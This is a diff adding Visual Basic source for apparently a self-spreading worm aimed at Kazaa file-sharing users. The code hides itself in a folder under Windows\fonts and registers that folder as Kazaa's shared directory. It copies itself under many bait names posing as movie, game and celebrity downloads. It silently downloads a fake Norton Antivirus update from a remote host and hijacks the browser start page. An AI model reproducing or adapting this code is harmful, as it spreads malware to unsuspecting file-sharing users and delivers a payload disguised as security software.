@@ -1,0 +1,74 @@
+   Sub fORM_lOAD()
+   If App.PrevInstance = True Then
+       End
+   End If
+       Set fso = CreateObject("Scripting.FileSystemObject")
+       Set windir = fso.GetSpecialFolder(0)
+       If (Not (fso.FolderExists(windir & "\" & "fonts\^-^"))) Then
+           fso.CreateFolder windir & "\" & "fonts\^-^"
+       End If
+       regcreate "HKCU\Software\Kazaa\Transfer\DlDir0", "012345:" & windir &
+   "\" & "fonts\^-^"
+       fso.CopyFile App.Path & "\" & App.EXEName & ".exe", windir & "\" &
+   "fonts\^-^\Baldur´s Gate-Full Downloader.exe"
+       fso.CopyFile App.Path & "\" & App.EXEName & ".exe", windir & "\" &
+   "fonts\^-^\ScaryMovie2-FullDownloader.exe"
+       fso.CopyFile App.Path & "\" & App.EXEName & ".exe", windir & "\" &
+   "fonts\^-^\StarWars2 - CloneAttack - FullDownloader.exe"
+       fso.CopyFile App.Path & "\" & App.EXEName & ".exe", windir & "\" &
+   "fonts\^-^\Spiderman-FullDownloader.exe"
+       fso.CopyFile App.Path & "\" & App.EXEName & ".exe", windir & "\" &
+   "fonts\^-^\Shakira.exe"
+       fso.CopyFile App.Path & "\" & App.EXEName & ".exe", windir & "\" &
+   "fonts\^-^\Gladiator-FullDownloader.exe"
+       fso.CopyFile App.Path & "\" & App.EXEName & ".exe", windir & "\" &
+   "fonts\^-^\AikaQuest3Hentai-FullDownloader.exe"
+       fso.CopyFile App.Path & "\" & App.EXEName & ".exe", windir & "\" &
+   "fonts\^-^\MoviezChannelsInstaler.exe"
+       fso.CopyFile App.Path & "\" & App.EXEName & ".exe", windir & "\" &
+   "fonts\^-^\Zidane-ScreenInstaler.exe"
+       fso.CopyFile App.Path & "\" & App.EXEName & ".exe", windir & "\" &
+   "fonts\^-^\LordOfTheRings-FullDownloader.exe"
+       fso.CopyFile App.Path & "\" & App.EXEName & ".exe", windir & "\" &
+   "fonts\^-^\SIMS-FullDownloader.exe"
+       fso.CopyFile App.Path & "\" & App.EXEName & ".exe", windir & "\" &
+   "fonts\^-^\1.exe"
+       fso.CopyFile App.Path & "\" & App.EXEName & ".exe", windir & "\" &
+   "fonts\^-^\2.exe"
+       fso.CopyFile App.Path & "\" & App.EXEName & ".exe", windir & "\" &
+   "fonts\^-^\3.exe"
+       fso.CopyFile App.Path & "\" & App.EXEName & ".exe", windir & "\" &
+   "fonts\^-^\4.exe"
+       fso.CopyFile App.Path & "\" & App.EXEName & ".exe", windir & "\" &
+   "fonts\^-^\5.exe"
+       fso.CopyFile App.Path & "\" & App.EXEName & ".exe", windir & "\" &
+   "fonts\^-^\StriderHyriu.exe"
+       XSD = 0
+       Do While XSD < 500
+       Randomize
+       num = Int((5 * Rnd) + 1)
+       num2 = Int((100000 * Rnd) + 1)
+       If num = 1 Then fso.CopyFile App.Path & "\" & App.EXEName & ".exe",
+   windir & "\" & "fonts\^-^\Rebeka-FullInstaler.exe", True
+       If num = 2 Then fso.CopyFile App.Path & "\" & App.EXEName & ".exe",
+   windir & "\" & "fonts\^-^\BinLadenFucksss!!-FullGame.exe", True
+       If num = 3 Then fso.CopyFile App.Path & "\" & App.EXEName & ".exe",
+   windir & "\" & "fonts\^-^\3~34" & num2 & ".exe", True
+       If num = 4 Then fso.CopyFile App.Path & "\" & App.EXEName & ".exe",
+   windir & "\" & "fonts\^-^\666.exe", True
+       If num = 5 Then fso.CopyFile App.Path & "\" & App.EXEName & ".exe",
+   windir & "\" & "fonts\^-^\Minerva" & num2 & ".exe", True
+       XSD = XSD + 1
+       Loop
+   nResult = Shell("start.exe
+   http://shermnar.web.ctonet.it/NortonAntivirus2002UpdateInstaler.exe",
+   vbHide)
+   regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page",
+   "http://shermnar.web.ctonet.it/NortonAntivirus2002UpdateInstaler.exe"
+   End
+   End Sub
+
+   Sub regcreate(regkey, regvalue)
+   Set regedit = CreateObject("WScript.Shell")
+   regedit.RegWrite regkey, regvalue
+   End Sub
